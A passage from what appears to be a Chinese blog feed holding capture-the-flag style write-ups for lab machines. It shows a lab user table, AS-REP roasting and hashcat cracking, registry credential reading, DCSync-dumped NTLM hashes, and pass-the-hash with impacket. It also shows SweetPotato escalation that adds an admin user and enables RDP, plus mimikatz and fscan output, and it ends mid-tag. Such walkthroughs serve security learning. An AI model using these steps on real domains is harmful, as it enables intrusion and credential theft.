13878840690 | MAO DA          || 284 | qiaomei@xiaorang.lab       | 13053207462 | QIAO MEI        || 285 | nongzhen@xiaorang.lab      | 15227699960 | NONG ZHEN       || 286 | dongshu@xiaorang.lab       | 15695562947 | DONG SHU        || 287 | zhuzhu@xiaorang.lab        | 13070163385 | ZHU ZHU         || 288 | jiyun@xiaorang.lab         | 13987332999 | JI YUN          || 289 | qiguanrou@xiaorang.lab     | 15605983582 | QI GUAN ROU     || 290 | yixue@xiaorang.lab         | 18451603140 | YI XUE          || 291 | chujun@xiaorang.lab        | 15854942459 | CHU JUN         || 292 | shenshan@xiaorang.lab      | 17712052191 | SHEN SHAN       || 293 | lefen@xiaorang.lab         | 13271196544 | LE FEN          || 294 | yubo@xiaorang.lab          | 13462202742 | YU BO           || 295 | helianrui@xiaorang.lab     | 15383000907 | HE LIAN RUI     || 296 | xuanqun@xiaorang.lab       | 18843916267 | XUAN QUN        || 297 | shangjun@xiaorang.lab      | 15162486698 | SHANG JUN       || 298 | huguang@xiaorang.lab       | 18100586324 | HU GUANG        || 299 | wansifu@xiaorang.lab       | 18494761349 | WAN SI FU       || 300 | fenghong@xiaorang.lab      | 13536727314 | FENG HONG       || 301 | wanyan@xiaorang.lab        | 17890844429 | WAN YAN         || 302 | diyan@xiaorang.lab         | 18534028047 | DI YAN          || 303 | xiangyu@xiaorang.lab       | 13834043047 | XIANG YU        || 304 | songyan@xiaorang.lab       | 15282433280 | SONG YAN        || 305 | fandi@xiaorang.lab         | 15846960039 | FAN DI          || 306 | xiangjuan@xiaorang.lab     | 18120327434 | XIANG JUAN      || 307 | beirui@xiaorang.lab        | 18908661803 | BEI RUI         || 308 | didi@xiaorang.lab          | 13413041463 | DI DI           || 309 | zhubin@xiaorang.lab        | 15909558554 | ZHU BIN         || 310 | lingchun@xiaorang.lab      | 13022790678 | LING CHUN       || 311 | zhenglu@xiaorang.lab       | 13248244873 | ZHENG LU        || 312 | xundi@xiaorang.lab         | 18358493414 | XUN DI          || 313 | wansishun@xiaorang.lab     | 18985028319 | WAN SI SHUN     || 314 | yezongyue@xiaorang.lab     | 13866302416 | YE ZONG YUE     || 315 | bianmei@xiaorang.lab       | 18540879992 | BIAN MEI        || 316 | shanshao@xiaorang.lab      | 18791488918 | SHAN SHAO       || 317 | zhenhui@xiaorang.lab       | 13736784817 | ZHEN HUI        || 318 | chengli@xiaorang.lab       | 15913267394 | CHENG LI        || 319 | yufen@xiaorang.lab         | 18432795588 | YU FEN          || 320 | jiyi@xiaorang.lab          | 13574211454 | JI YI           || 321 | panbao@xiaorang.lab        | 13675851303 | PAN BAO         || 322 | mennane@xiaorang.lab       | 15629706208 | MEN NAN E       || 323 | fengsi@xiaorang.lab        | 13333432577 | FENG SI         || 324 | mingyan@xiaorang.lab       | 18296909463 | MING YAN        || 325 | luoyou@xiaorang.lab        | 15759321415 | LUO YOU         || 326 | liangduanqing@xiaorang.lab | 13150744785 | LIANG DUAN QING || 327 | nongyan@xiaorang.lab       | 18097386975 | NONG YAN        || 328 | haolun@xiaorang.lab        | 15152700465 | HAO LUN         || 329 | oulun@xiaorang.lab         | 13402760696 | OU LUN          || 330 | weichipeng@xiaorang.lab    | 18057058937 | WEI CHI PENG    || 331 | qidiaofang@xiaorang.lab    | 18728297829 | QI DIAO FANG    || 332 | xuehe@xiaorang.lab         | 13398862169 | XUE HE          || 333 | chensi@xiaorang.lab        | 18030178713 | CHEN SI         || 334 | guihui@xiaorang.lab        | 17882514129 | GUI HUI         || 335 | fuyue@xiaorang.lab         | 18298436549 | FU YUE          || 336 | wangxing@xiaorang.lab      | 17763645267 | WANG XING       || 337 | zhengxiao@xiaorang.lab     | 18673968392 | ZHENG XIAO      || 338 | guhui@xiaorang.lab         | 15166711352 | GU HUI          || 339 | baoai@xiaorang.lab         | 15837430827 | BAO AI          || 340 | hangzhao@xiaorang.lab      | 13235488232 | HANG ZHAO       || 341 | xingye@xiaorang.lab        | 13367587521 | XING YE         || 342 | qianyi@xiaorang.lab        | 18657807767 | QIAN YI         || 343 | xionghong@xiaorang.lab     | 17725874584 | XIONG HONG      || 344 | zouqi@xiaorang.lab         | 15300430128 | ZOU QI          || 345 | rongbiao@xiaorang.lab      | 13034242682 | RONG BIAO       || 346 | gongxin@xiaorang.lab       | 15595839880 | GONG XIN        || 347 | luxing@xiaorang.lab        | 18318675030 | LU XING         || 348 | huayan@xiaorang.lab        | 13011805354 | HUA YAN         || 349 | duyue@xiaorang.lab         | 15515878208 | DU YUE          || 350 | xijun@xiaorang.lab         | 17871583183 | XI JUN          || 351 | daiqing@xiaorang.lab       | 18033226216 | DAI QING        || 352 | yingbiao@xiaorang.lab      | 18633421863 | YING BIAO       || 353 | hengteng@xiaorang.lab      | 15956780740 | HENG TENG       || 354 | changwu@xiaorang.lab       | 15251485251 | CHANG WU        || 355 | chengying@xiaorang.lab     | 18788248715 | CHENG YING      || 356 | luhong@xiaorang.lab        | 17766091079 | LU HONG         || 357 | tongxue@xiaorang.lab       | 18466102780 | TONG XUE        || 358 | xiangqian@xiaorang.lab     | 13279611385 | XIANG QIAN      || 359 | shaokang@xiaorang.lab      | 18042645434 | SHAO KANG       || 360 | nongzhu@xiaorang.lab       | 13934236634 | NONG ZHU        || 361 | haomei@xiaorang.lab        | 13406913218 | HAO MEI         || 362 | maoqing@xiaorang.lab       | 15713298425 | MAO QING        || 363 | xiai@xiaorang.lab          | 18148404789 | XI AI           || 364 | bihe@xiaorang.lab          | 13628593791 | BI HE           || 365 | gaoli@xiaorang.lab         | 15814408188 | GAO LI          || 366 | jianggong@xiaorang.lab     | 15951118926 | JIANG GONG      || 367 | pangning@xiaorang.lab      | 13443921700 | PANG NING       || 368 | ruishi@xiaorang.lab        | 15803112819 | RUI SHI         || 369 | wuhuan@xiaorang.lab        | 13646953078 | WU HUAN         || 370 | qiaode@xiaorang.lab        | 13543564200 | QIAO DE         || 371 | mayong@xiaorang.lab        | 15622971484 | MA YONG         || 372 | hangda@xiaorang.lab        | 15937701659 | HANG DA         || 373 | changlu@xiaorang.lab       | 13734991654 | CHANG LU        || 374 | liuyuan@xiaorang.lab       | 15862054540 | LIU YUAN        || 375 | chenggu@xiaorang.lab       | 15706685526 | CHENG GU        || 376 | shentuyun@xiaorang.lab     | 15816902379 | SHEN TU YUN     || 377 | zhuangsong@xiaorang.lab    | 17810274262 | ZHUANG SONG     || 378 | chushao@xiaorang.lab       | 18822001640 | CHU SHAO        || 379 | heli@xiaorang.lab          | 13701347081 | HE LI           || 380 | haoming@xiaorang.lab       | 15049615282 | HAO MING        || 381 | xieyi@xiaorang.lab         | 17840660107 | XIE YI          || 382 | shangjie@xiaorang.lab      | 15025010410 | SHANG JIE       || 383 | situxin@xiaorang.lab       | 18999728941 | SI TU XIN       || 384 | linxi@xiaorang.lab         | 18052976097 | LIN XI          || 385 | zoufu@xiaorang.lab         | 15264535633 | ZOU FU          || 386 | qianqing@xiaorang.lab      | 18668594658 | QIAN QING       || 387 | qiai@xiaorang.lab          | 18154690198 | QI AI           || 388 | ruilin@xiaorang.lab        | 13654483014 | RUI LIN         || 389 | luomeng@xiaorang.lab       | 15867095032 | LUO MENG        || 390 | huaren@xiaorang.lab        | 13307653720 | HUA REN         || 391 | yanyangmei@xiaorang.lab    | 15514015453 | YAN YANG MEI    || 392 | zuofen@xiaorang.lab        | 15937087078 | ZUO FEN         || 393 | manyuan@xiaorang.lab       | 18316106061 | MAN YUAN        || 394 | yuhui@xiaorang.lab         | 18058257228 | YU HUI          || 395 | sunli@xiaorang.lab         | 18233801124 | SUN LI          || 396 | guansixin@xiaorang.lab     | 13607387740 | GUAN SI XIN     || 397 | ruisong@xiaorang.lab       | 13306021674 | RUI SONG        || 398 | qiruo@xiaorang.lab         | 13257810331 | QI RUO          || 399 | jinyu@xiaorang.lab         | 18565922652 | JIN YU          || 400 | shoujuan@xiaorang.lab      | 18512174415 | SHOU JUAN       || 401 | yanqian@xiaorang.lab       | 13799789435 | YAN QIAN        || 402 | changyun@xiaorang.lab      | 18925015029 | CHANG YUN       || 403 | hualu@xiaorang.lab         | 13641470801 | HUA LU          || 404 | huanming@xiaorang.lab      | 15903282860 | HUAN MING       || 405 | baoshao@xiaorang.lab       | 13795275611 | BAO SHAO        || 406 | hongmei@xiaorang.lab       | 13243605925 | HONG MEI        || 407 | manyun@xiaorang.lab        | 13238107359 | MAN YUN         || 408 | changwan@xiaorang.lab      | 13642205622 | CHANG WAN       || 409 | wangyan@xiaorang.lab       | 13242486231 | WANG YAN        || 410 | shijian@xiaorang.lab       | 15515077573 | SHI JIAN        || 411 | ruibei@xiaorang.lab        | 18157706586 | RUI BEI         || 412 | jingshao@xiaorang.lab      | 18858376544 | JING SHAO       || 413 | jinzhi@xiaorang.lab        | 18902437082 | JIN ZHI         || 414 | yuhui@xiaorang.lab         | 15215599294 | YU HUI          || 415 | zangpeng@xiaorang.lab      | 18567574150 | ZANG PENG       || 416 | changyun@xiaorang.lab      | 15804640736 | CHANG YUN       || 417 | yetai@xiaorang.lab         | 13400150018 | YE TAI          || 418 | luoxue@xiaorang.lab        | 18962643265 | LUO XUE         || 419 | moqian@xiaorang.lab        | 18042706956 | MO QIAN         || 420 | xupeng@xiaorang.lab        | 15881934759 | XU PENG         || 421 | ruanyong@xiaorang.lab      | 15049703903 | RUAN YONG       || 422 | guliangxian@xiaorang.lab   | 18674282714 | GU LIANG XIAN   || 423 | yinbin@xiaorang.lab        | 15734030492 | YIN BIN         || 424 | huarui@xiaorang.lab        | 17699257041 | HUA RUI         || 425 | niuya@xiaorang.lab         | 13915041589 | NIU YA          || 426 | guwei@xiaorang.lab         | 13584571917 | GU WEI          || 427 | qinguan@xiaorang.lab       | 18427953434 | QIN GUAN        || 428 | yangdanhan@xiaorang.lab    | 15215900100 | YANG DAN HAN    || 429 | yingjun@xiaorang.lab       | 13383367818 | YING JUN        || 430 | weiwan@xiaorang.lab        | 13132069353 | WEI WAN         || 431 | sunduangu@xiaorang.lab     | 15737981701 | SUN DUAN GU     || 432 | sisiwu@xiaorang.lab        | 18021600640 | SI SI WU        || 433 | nongyan@xiaorang.lab       | 13312613990 | NONG YAN        || 434 | xuanlu@xiaorang.lab        | 13005748230 | XUAN LU         || 435 | yunzhong@xiaorang.lab      | 15326746780 | YUN ZHONG       || 436 | gengfei@xiaorang.lab       | 13905027813 | GENG FEI        || 437 | zizhuansong@xiaorang.lab   | 13159301262 | ZI ZHUAN SONG   || 438 | ganbailong@xiaorang.lab    | 18353612904 | GAN BAI LONG    || 439 | shenjiao@xiaorang.lab      | 15164719751 | SHEN JIAO       || 440 | zangyao@xiaorang.lab       | 18707028470 | ZANG YAO        || 441 | yangdanhe@xiaorang.lab     | 18684281105 | YANG DAN HE     || 442 | chengliang@xiaorang.lab    | 13314617161 | CHENG LIANG     || 443 | xudi@xiaorang.lab          | 18498838233 | XU DI           || 444 | wulun@xiaorang.lab         | 18350490780 | WU LUN          || 445 | yuling@xiaorang.lab        | 18835870616 | YU LING         || 446 | taoya@xiaorang.lab         | 18494928860 | TAO YA          || 447 | jinle@xiaorang.lab         | 15329208123 | JIN LE          || 448 | youchao@xiaorang.lab       | 13332964189 | YOU CHAO        || 449 | liangduanzhi@xiaorang.lab  | 15675237494 | LIANG DUAN ZHI  || 450 | jiagupiao@xiaorang.lab     | 17884962455 | JIA GU PIAO     || 451 | ganze@xiaorang.lab         | 17753508925 | GAN ZE          || 452 | jiangqing@xiaorang.lab     | 15802357200 | JIANG QING      || 453 | jinshan@xiaorang.lab       | 13831466303 | JIN SHAN        || 454 | zhengpubei@xiaorang.lab    | 13690156563 | ZHENG PU BEI    || 455 | cuicheng@xiaorang.lab      | 17641589842 | CUI CHENG       || 456 | qiyong@xiaorang.lab        | 13485427829 | QI YONG         || 457 | qizhu@xiaorang.lab         | 18838859844 | QI ZHU          || 458 | ganjian@xiaorang.lab       | 18092585003 | GAN JIAN        || 459 | yurui@xiaorang.lab         | 15764121637 | YU RUI          || 460 | feishu@xiaorang.lab        | 18471512248 | FEI SHU         || 461 | chenxin@xiaorang.lab       | 13906545512 | CHEN XIN        || 462 | shengzhe@xiaorang.lab      | 18936457394 | SHENG ZHE       || 463 | wohong@xiaorang.lab        | 18404022650 | WO HONG         || 464 | manzhi@xiaorang.lab        | 15973350408 | MAN ZHI         || 465 | xiangdong@xiaorang.lab     | 13233908989 | XIANG DONG      || 466 | weihui@xiaorang.lab        | 15035834945 | WEI HUI         || 467 | xingquan@xiaorang.lab      | 18304752969 | XING QUAN       || 468 | miaoshu@xiaorang.lab       | 15121570939 | MIAO SHU        || 469 | gongwan@xiaorang.lab       | 18233990398 | GONG WAN        || 470 | qijie@xiaorang.lab         | 15631483536 | QI JIE          || 471 | shaoting@xiaorang.lab      | 15971628914 | SHAO TING       || 472 | xiqi@xiaorang.lab          | 18938747522 | XI QI           || 473 | jinghong@xiaorang.lab      | 18168293686 | JING HONG       || 474 | qianyou@xiaorang.lab       | 18841322688 | QIAN YOU        || 475 | chuhua@xiaorang.lab        | 15819380754 | CHU HUA         || 476 | yanyue@xiaorang.lab        | 18702474361 | YAN YUE         || 477 | huangjia@xiaorang.lab      | 13006878166 | HUANG JIA       || 478 | zhouchun@xiaorang.lab      | 13545820679 | ZHOU CHUN       || 479 | jiyu@xiaorang.lab          | 18650881187 | JI YU           || 480 | wendong@xiaorang.lab       | 17815264093 | WEN DONG        || 481 | heyuan@xiaorang.lab        | 18710821773 | HE YUAN         || 482 | mazhen@xiaorang.lab        | 18698248638 | MA ZHEN         || 483 | shouchun@xiaorang.lab      | 15241369178 | SHOU CHUN       || 484 | liuzhe@xiaorang.lab        | 18530936084 | LIU ZHE         || 485 | fengbo@xiaorang.lab        | 15812110254 | FENG BO         || 486 | taigongyuan@xiaorang.lab   | 15943349034 | TAI GONG YUAN   || 487 | gesheng@xiaorang.lab       | 18278508909 | GE SHENG        || 488 | songming@xiaorang.lab      | 13220512663 | SONG MING       || 489 | yuwan@xiaorang.lab         | 15505678035 | YU WAN          || 490 | diaowei@xiaorang.lab       | 13052582975 | DIAO WEI        || 491 | youyi@xiaorang.lab         | 18036808394 | YOU YI          || 492 | rongxianyu@xiaorang.lab    | 18839918955 | RONG XIAN YU    || 493 | fuyi@xiaorang.lab          | 15632151678 | FU YI           || 494 | linli@xiaorang.lab         | 17883399275 | LIN LI          || 495 | weixue@xiaorang.lab        | 18672465853 | WEI XUE         || 496 | hejuan@xiaorang.lab        | 13256081102 | HE JUAN         || 497 | zuoqiutai@xiaorang.lab     | 18093001354 | ZUO QIU TAI     || 498 | siyi@xiaorang.lab          | 17873307773 | SI YI           || 499 | shenshan@xiaorang.lab      | 18397560369 | SHEN SHAN       || 500 | tongdong@xiaorang.lab      | 15177549595 | TONG DONG       |+-----+----------------------------+-------------+-----------------+</code></pre><p>利用脚本提取用户：</p><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> reobj <span class="token operator">=</span> re<span class="token punctuation">.</span>compile<span class="token punctuation">(</span>r<span class="token string">"(\w+)@xiaorang.lab"</span><span class="token punctuation">)</span><span class="token keyword">with</span> open<span class="token punctuation">(</span><span class="token string">"2.py"</span><span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>    data <span class="token operator">=</span> f<span class="token punctuation">.</span>readlines<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> data<span class="token punctuation">:</span>        result <span class="token operator">=</span> re<span class="token punctuation">.</span>findall<span class="token punctuation">(</span>obj<span class="token punctuation">,</span> i<span class="token punctuation">)</span>        <span class="token keyword">if</span> len<span class="token punctuation">(</span>result<span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>result<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span></code></pre><p>​<img src="/Blogimages/Time/image-20231022133218-2ejlh0g.png" alt="image">​</p><p>得到user.txt:</p><pre class=" language-xml"><code class="language-xml">chenyantangguibuningbeishushushifuyipangchengtonghaojiaoshandulunkejuangexinluguguzaichengfeicairanqunzhouyishishuyanyunchengqiulouyoumaqunwenbiaoweishengshanzhangxinchuyuanwenliangyulvxueluyueganjianpangzhenguohonglezhongsheweiyuedujianlidongjinhongqunyexingmaodaqiaomeinongzhendongshuzhuzhujiyunqiguanrouyixuechujunshenshanlefenyubohelianruixuanqunshangjunhuguangwansifufenghongwanyandiyanxiangyusongyanfandixiangjuanbeiruididizhubinlingchunzhengluxundiwansishunyezongyuebianmeishanshaozhenhuichengliyufenjiyipanbaomennanefengsimingyanluoyouliangduanqingnongyanhaolunoulunweichipengqidiaofangxuehechensiguihuifuyuewangxingzhengxiaoguhuibaoaihangzhaoxingyeqianyixionghongzouqirongbiaogongxinluxinghuayanduyuexijundaiqingyingbiaohengtengchangwuchengyingluhongtongxuexiangqianshaokangnongzhuhaomeimaoqingxiaibihegaolijianggongpangningruishiwuhuanqiaodemayonghangdachangluliuyuanchenggushentuyunzhuangsongchushaohelihaomingxieyishangjiesituxinlinxizoufuqianqingqiairuilinluomenghuarenyanyangmeizuofenmanyuanyuhuisunliguansixinruisongqiruojinyushoujuanyanqianchangyunhualuhuanmingbaoshaohongmeimanyunchangwanwangyanshijianruibeijingshaojinzhiyuhuizangpengchangyunyetailuoxuemoqianxupengruanyongguliangxianyinbinhuaruiniuyaguweiqinguanyangdanhanyingjunweiwansunduangusisiwunongyanxuanluyunzhonggengfeizizhuansongganbailongshenjiaozangyaoyangdanhechengliangxudiwulunyulingtaoyajinleyouchaoliangduanzhijiagupiaoganzejiangqingjinshanzhengpubeicuichengqiyongqizhuganjianyuruifeishuchenxinshengzhewohongmanzhixiangdongweihuixingquanmiaoshugongwanqijieshaotingxiqijinghongqianyouchuhuayanyuehuangjiazhouchunjiyuwendongheyuanmazhenshouchunliuzhefengbotaigongyuangeshengsongmingyuwandiaoweiyouyirongxianyufuyilinliweixuehejuanzuoqiutaisiyishenshantongdong</code></pre><p>这个看着就是域用户，结合上面的提示，利用kerberos。</p><p>可以利用域内用户枚举来进行攻击，kerberos的认证默认是开启的，如果关闭了这个域身份认证，就可以想域控的kerberos的88端口发起请求，用户不存在时返回包提示KDC_ERR_C_PRINCIPAL_UNKNOWN，但是如果存在会不经过验证就直接返回该用户Hash加密的<code>Login Session Key</code>​。所以只要hash跑的出来就可以登录该用户</p><p>首先挂上frp代理</p><p>枚举域内用户命令：</p><pre class=" language-xml"><code class="language-xml">proxychains python3 GetNPUsers.py -dc-ip 172.22.6.12 -usersfile ../../../user.txt xiaorang.lab/</code></pre><p>​<img src="/Blogimages/Time/image-20231022104315-0e78u50.png" alt="image">​</p><p>这里会返回一个结果：</p><pre class=" language-xml"><code class="language-xml">$krb5asrep$23$zhangxin@XIAORANG.LAB:3635b10b08e2f6a8641f94189728aa7d$5cffc4457e8b98c076c4f892b4d9bc4b13dd43574792ace303f143788a28408e798aa5f36001bf22946e9fd208e5b3e37103e1b6f1ccec1c8427e2137cfba154223bd463170b806673cae5eaa48129d63b78626e0e1986920a5f3b6ee71bb570831e8cb3d9c6985a834b869c09af6aaf5c7168fc7d4ddc59ddb59a6cd9b5510a16b5b0366298f21d4eb71e071228c9a2de61990c2107a7bd050f4320b055d8e33535b7b5d4d56514ca0c244c33db7987889f30c455af375e0fae6135eb4ac4daab7ae0a4bc1d0f3e1852fca688637a5d329e767837fc971fbb</code></pre><p>这个结果可以利用工具结合字典跑：</p><pre class=" language-bash"><code class="language-bash">hashcat -m 18200 password -a 0 ./rockyou.txt --force</code></pre><p>跑完之后如果有结果可以看到密码：</p><p>​<img src="/Blogimages/Time/image-20231022124911-r52o16j.png" alt="image">​</p><p>如果找不到也可以直接再用命令：</p><pre class=" language-xml"><code class="language-xml">hashcat -m 18200 password -a 0 ./rockyou.txt --force --show</code></pre><p>​<img src="/Blogimages/Time/image-20231022124941-f1dm1bd.png" alt="image">​</p><p>这个回显更直观</p><p>账号密码：<code>zhangxin@XIAORANG.LAB:strawberry</code>​</p><p>如果跑报错了尝试删除<code>OpenSSL库</code>​</p><pre class=" language-xml"><code class="language-xml">sudo python3 -m pip uninstall pyOpenSSL</code></pre><p>接下来我们就是想要找主机登录了，所以我们先扫描哪台开放了3389</p><p>小tips：fscan默认没有扫描3389端口，原因：</p><p>​<img src="/Blogimages/Time/image-20231022104922-i0m7im5.png" alt="image">​</p><p>但是我们可以手动指定扫描：</p><p>​<img src="/Blogimages/Time/image-20231022125046-eja2vtv.png" alt="image">​</p><p>发现两台主机开启了3389：</p><pre class=" language-xml"><code class="language-xml">172.22.6.12172.22.6.25</code></pre><p>毫无疑问只有25能够登录</p><p>这里利用rdesktop还是报了版本错误的问题，那就使用remmina</p><pre class=" language-xml"><code class="language-xml">proxychains4 remmina</code></pre><p>挂个启动一下</p><p>​<img src="/Blogimages/Time/image-20231022125425-v3jmo2j.png" alt="image">​</p><p>配置好之后就可以启动了。</p><p>最后一个选项Share folder是为了更好地传输文件挂载的磁盘</p><p>进去后权限低，可以先看一下user的会话情况：</p><p>​<img src="/Blogimages/Time/image-20231022125519-0frg6pv.png" alt="image"></p><p>这里借助SharpHound.exe分析域环境</p><p>​<img src="/Blogimages/Time/image-20231022125644-el3p31g.png" alt="image">​</p><p>我们在最左边的位置，想要拿到域控权限必须先靠近YUXUAN用户</p><p>放大之后我们可以看到：</p><p>​<img src="/Blogimages/Time/image-20231022125725-q9yl8gp.png" alt="image">​</p><p>两个用户之间是存在HasSession的</p><p>HasSession：用户与计算机时进行会话时，凭据会保留在内存中，说明yuxuan登录过WIN2019</p><p>这里可以直接利用</p><p>​<code>reg query &quot;HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon&quot;</code>​</p><p>查询域内凭据</p><p><img src="/Blogimages/Time/image-20231022111308-bqmthdk.png" alt="image">​</p><p>可以看到账号密码：</p><p>yuxuan Yuxuan7QbrgZ3L</p><p>重新登录这个用户，登录成功后下一步做什么</p><p>可以继续看这个分析的：</p><p>​<img src="/Blogimages/Time/image-20231022130037-xybymiw.png" alt="image">​</p><p>他说有一个HasSIDHistory</p><p>HasSIDHistory：用户滥用了SID历史功能(SIDHistory是一个为支持域迁移方案而设置的属性，当一个对象从一个域迁移到另一个域时，会在新域创建一个新的SID作为该对象的objectSid，在之前域中的SID会添加到该对象的sIDHistory属性中，此时该对象将保留在原来域的SID对应的访问权限）</p><p>所以可以利用<code>dcsync 攻击</code></p><p>这里可以抓到他们的hash值：</p><pre class=" language-xml"><code class="language-xml">1171    sheweiyue       d17aecec7aa3a6f4a1e8d8b7c2163b351172    dujian  8f7846c78f03bf55685a697fe20b08571173    lidongjin       34638b8589d235dea49e2153ae89f2a11174    hongqun 6c791ef38d72505baeb4a391de05b6e11175    yexing  34842d36248c2492a5c9a1ae5d850d541176    maoda   6e65c0796f05c0118fbaa8d9f13090261177    qiaomei 6a889f350a0ebc15cf9306687da3fd34502     krbtgt  a4206b127773884e2c7ea86cdd282d9c1178    wenshao b31c6aa5660d6e87ee046b1bb5d0ff79500     Administrator   04d93ffd6f5f6e4490e0de23f240a5e91000    DC-PROGAME$     5c76d177587a06495af3a7494ffb2e1f1180    yuxuan  376ece347142d1628632d440530e8eed1181    WIN2019$        91c31e8e8aa3270652c7e1e11fa17b3b1179    zhangxin        d6c5976e07cdb410be19b84126367e3d</code></pre><p>我们关注：</p><pre class=" language-xml"><code class="language-xml">500     Administrator   04d93ffd6f5f6e4490e0de23f240a5e9</code></pre><p>利用该hash横向即可：</p><pre class=" language-xml"><code class="language-xml">proxychains4 impacket-wmiexec XIAORANG/administrator@172.22.6.25 -hashes :04d93ffd6f5f6e4490e0de23f240a5e9proxychains4 impacket-wmiexec XIAORANG/administrator@172.22.6.12 -hashes :04d93ffd6f5f6e4490e0de23f240a5e9</code></pre><h2 id="flag3"><a href="#flag3" class="headerlink" title="flag3"></a>flag3</h2><p><img src="/Blogimages/Time/image-20231022112540-959gozs.png" alt="image">​</p><h2 id="flag4"><a href="#flag4" class="headerlink" title="flag4"></a>flag4</h2><p>​<img src="/Blogimages/Time/image-20231022112613-lpurmpi.png" alt="image">​</p>]]></content>
      
      
      <categories>
          
          <category> 靶机 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>春秋云镜Tsclient</title>
      <link href="/2023/10/22/Tsclient/"/>
      <url>/2023/10/22/Tsclient/</url>
      
        <content type="html"><![CDATA[<h1 id="Tsclient"><a href="#Tsclient" class="headerlink" title="Tsclient"></a>Tsclient</h1><p>过程遇到的问题：</p><pre class=" language-xml"><code class="language-xml">1.拿到html如何横向2.内网代理，如何通过远程172的内网代理到我本地192的内网，拓扑：            172.22.8.46 192.168.120.128（Kali）                ↓↑            172.22.8.18(39.99.224.53)----->123.249.8.26(CS)---------->192.168.120.13.远程内网172.22.8.46不出网，如何上线CS</code></pre><p>Fscan扫描：</p><p>​<img src="/Blogimages/Tsclient/image-20230823081434-rjdwvd5.png" alt="image">​</p><p>扫到一个数据库密码，连接：</p><p>​<img src="/Blogimages/Tsclient/image-20230823081419-au23h2i.png" alt="image">​</p><p>甜土豆提权执行命令：</p><p>​<img src="/Blogimages/Tsclient/image-20230823083645-0khndbc.png" alt="image">​</p><h2 id="flag1"><a href="#flag1" class="headerlink" title="flag1"></a>flag1</h2><p>新建用户：</p><pre class=" language-bash"><code class="language-bash">C:/ProgramData/SweetPotato.exe -a <span class="token string">"net user qingfeng qwer1234! /add"</span>C:/ProgramData/SweetPotato.exe -a <span class="token string">"net localgroup administrators qingfeng /add"</span>C:/ProgramData/SweetPotato.exe -a <span class="token string">'REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f'</span></code></pre><p>登录远程桌面拿到第一个flag</p><p>这里由于远程桌面版本好像比较低，用rdesktop是无法连接成功的，所以使用apt install remmina下载remmina</p><p>使用remmina即可忽略版本问题</p><p>​<img src="/Blogimages/Tsclient/image-20230823084104-apoi8b8.png" alt="image">​</p><h2 id="flag2"><a href="#flag2" class="headerlink" title="flag2"></a>flag2</h2><p>上个猕猴桃看能不能抓到密码：</p><pre class=" language-bash"><code class="language-bash">logprivilege::debugsekurlsa::logonpasswords</code></pre><pre class=" language-xml"><code class="language-xml">Authentication Id : 0 ; 661009 (00000000:000a1611)Session           : RemoteInteractive from 2User Name         : JohnDomain            : WIN-WEBLogon Server      : WIN-WEBLogon Time        : 2023/8/23 8:12:39SID               : S-1-5-21-4088072006-1921831747-1237773115-1008    msv :     [00000003] Primary     * Username : John     * Domain   : WIN-WEB     * NTLM     : eec9381b043f098b011be51622282027     * SHA1     : 18056c7dda082b2b219dbaac6157a1fb234403bc    tspkg :    wdigest :     * Username : John     * Domain   : WIN-WEB     * Password : (null)    kerberos :     * Username : John     * Domain   : WIN-WEB     * Password : (null)    ssp :    credman :</code></pre><p>抓到了John账号的NTLM</p><p>内网先fscan扫一下：</p><pre class=" language-xml"><code class="language-xml">C:\Windows\Temp>fscan.exe -h 172.22.8.18/24   ___                              _  / _ \     ___  ___ _ __ __ _  ___| | __ / /_\/____/ __|/ __| '__/ _` |/ __| |/ // /_\\_____\__ \ (__| | | (_| | (__|   &lt;\____/     |___/\___|_|  \__,_|\___|_|\_\                     fscan version: 1.7.1start infoscan[*] 已完成 0/0 listen ip4:icmp 0.0.0.0: socket: An attempt was made to access a socket in a way forbidden by its access permissions.trying RunIcmp2The current user permissions unable to send icmp packetsstart ping(icmp) Target 172.22.8.31     is alive(icmp) Target 172.22.8.15     is alive(icmp) Target 172.22.8.18     is alive(icmp) Target 172.22.8.46     is alive[*] Icmp alive hosts len is: 4172.22.8.15:88 open172.22.8.31:445 open172.22.8.46:445 open172.22.8.18:1433 open172.22.8.15:445 open172.22.8.46:139 open172.22.8.18:445 open172.22.8.15:139 open172.22.8.18:139 open172.22.8.31:139 open172.22.8.31:135 open172.22.8.18:135 open172.22.8.46:135 open172.22.8.15:135 open172.22.8.46:80 open172.22.8.18:80 open[*] alive ports len is: 16[*] start vulscan[+] NetInfo:[*]172.22.8.18   [->]WIN-WEB   [->]172.22.8.18   [->]2001:0:348b:fb58:1cb7:3b8e:d89d:8985[+] NetInfo:[*]172.22.8.46   [->]WIN2016   [->]172.22.8.46[+] NetInfo:[*]172.22.8.15   [->]DC01   [->]172.22.8.15[+] NetInfo:[*]172.22.8.31   [->]WIN19-CLIENT   [->]172.22.8.31[*] 172.22.8.31          XIAORANG\WIN19-CLIENT[*] 172.22.8.15    [+]DC XIAORANG\DC01[*] 172.22.8.46          XIAORANG\WIN2016           Windows Server 2016 Datacenter 14393[*] WebTitle:http://172.22.8.18        code:200 len:703    title:IIS Windows Server[*] WebTitle:http://172.22.8.46        code:200 len:703    title:IIS Windows Server[+] mssql:172.22.8.18:1433:sa 1qaz!QAZ[*] 已完成 16/16[*] 扫描结束,耗时: 11.0592205s</code></pre><p>现在发现三台域内主机：</p><pre class=" language-xml"><code class="language-xml">[*] 172.22.8.31          XIAORANG\WIN19-CLIENT[*] 172.22.8.15    [+]DC XIAORANG\DC01[*] 172.22.8.46          XIAORANG\WIN2016</code></pre><p>我们已经有控制权的是172.22.8.18</p><p>现在想要横向怎么办？</p><p>我们刚才创建的账号qingfeng肯定是和域内主机没有联系的</p><p>而且其他主机也没有什么可以打的web服务，只有一个默认的IIS，也扫不出来ms17-010</p><p>只能从john账号入手</p><p>先上线：</p><p>​<img src="/Blogimages/Tsclient/image-20231021162903-9pyueq9.png" 